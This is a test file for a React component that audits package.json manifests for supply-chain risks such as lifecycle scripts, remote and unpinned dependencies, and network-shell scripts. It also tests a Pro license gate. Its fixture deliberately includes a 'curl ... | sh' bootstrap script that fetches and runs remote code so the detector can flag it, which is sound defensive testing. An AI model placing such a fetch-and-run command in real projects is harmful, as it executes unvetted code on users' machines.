import { describe, expect, it } from 'vitest';
import { fireEvent, render, screen, waitFor } from '@testing-library/react';

import { PackageApp } from '../PackageApp.js';

const PRO = {
  version: 1 as const,
  licenseId: 'X',
  licensee: 'Buyer',
  tier: 'pro' as const,
  features: ['*'],
  issuedAt: '2026-01-01T00:00:00.000Z',
  expiresAt: null,
  signature: 's',
};

const SAMPLE = JSON.stringify(
  {
    name: '@acme/test',
    version: '1.0.0',
    private: true,
    packageManager: 'pnpm@10.12.1',
    scripts: {
      build: 'tsc -b',
      postinstall: 'node scripts/setup.js',
      bootstrap: 'curl https://example.test/install.sh | sh',
    },
    dependencies: {
      react: '^18.3.1',
      shared: '*',
    },
    devDependencies: {
      shared: '^1.0.0',
      remote: 'github:acme/remote',
    },
  },
  null,
  2,
);

describe('PackageApp', () => {
  it('renders manifest metadata, dependency counts, scripts, and dependencies', () => {
    render(<PackageApp initialInput={SAMPLE} />);

    expect(screen.getByTestId('package-metadata').textContent).toContain('@acme/test');
    expect(screen.getByTestId('package-counts').textContent).toContain('4');
    expect(screen.getByTestId('package-dependencies').textContent).toContain('react');
    expect(screen.getByTestId('package-scripts').textContent).toContain('postinstall');
  });

  it('surfaces package risk diagnostics from the engine', () => {
    render(<PackageApp initialInput={SAMPLE} />);

    expect(screen.getByText(/package\.lifecycle_script/)).toBeInTheDocument();
    expect(screen.getByText(/package\.network_shell_script/)).toBeInTheDocument();
    expect(screen.getByText(/package\.duplicate_dependency/)).toBeInTheDocument();
    expect(screen.getByText(/package\.remote_dependency/)).toBeInTheDocument();
    expect(screen.getByText(/package\.unpinned_dependency/)).toBeInTheDocument();
  });

  it('handles invalid JSON without throwing', () => {
    render(<PackageApp initialInput='{"name":' />);

    expect(screen.getByText(/package\.invalid_json/)).toBeInTheDocument();
    expect(screen.getByTestId('package-metadata').textContent).toContain('(missing)');
  });

  it('can hide dependency and script sections', () => {
    render(<PackageApp initialInput={SAMPLE} />);

    fireEvent.click(screen.getByTestId('package-toggle-dependencies'));
    fireEvent.click(screen.getByTestId('package-toggle-scripts'));

    expect(screen.queryByTestId('package-dependencies')).not.toBeInTheDocument();
    expect(screen.queryByTestId('package-scripts')).not.toBeInTheDocument();
  });

  it('copies the JSON summary through the injected clipboard', async () => {
    const writes: string[] = [];
    render(
      <PackageApp
        initialInput={SAMPLE}
        clipboardDeps={{
          apiWrite: async (text) => {
            writes.push(text);
          },
        }}
      />,
    );

    fireEvent.click(screen.getByTestId('package-copy-json'));
    await waitFor(() => {
      expect(writes).toHaveLength(1);
    });
    expect(JSON.parse(writes[0]!).name).toBe('@acme/test');
  });

  it('locks the Pro risk audit when free', () => {
    render(<PackageApp initialInput={SAMPLE} />);
    expect(screen.getByTestId('package-locked')).toBeInTheDocument();
    expect(screen.queryByTestId('package-audit-output')).not.toBeInTheDocument();
  });

  it('unlocks the dependency & license-risk report with a Pro entitlement', () => {
    render(<PackageApp initialInput={SAMPLE} entitlement={PRO} />);
    const out = screen.getByTestId('package-audit-output').textContent ?? '';
    expect(out).toContain('# NekoPackage risk audit');
    expect(out).toContain('package.network_shell_script');
  });

  it('renders the CI guard gate config in the CI guard view when Pro', () => {
    render(<PackageApp initialInput={SAMPLE} entitlement={PRO} />);
    fireEvent.click(screen.getByRole('radio', { name: 'CI guard' }));
    const guard = JSON.parse(screen.getByTestId('package-audit-output').textContent ?? '{}');
    expect(guard.tool).toBe('nekopackage');
    expect(guard.pass).toBe(false);
    expect(guard.exitCode).toBe(1);
  });
});
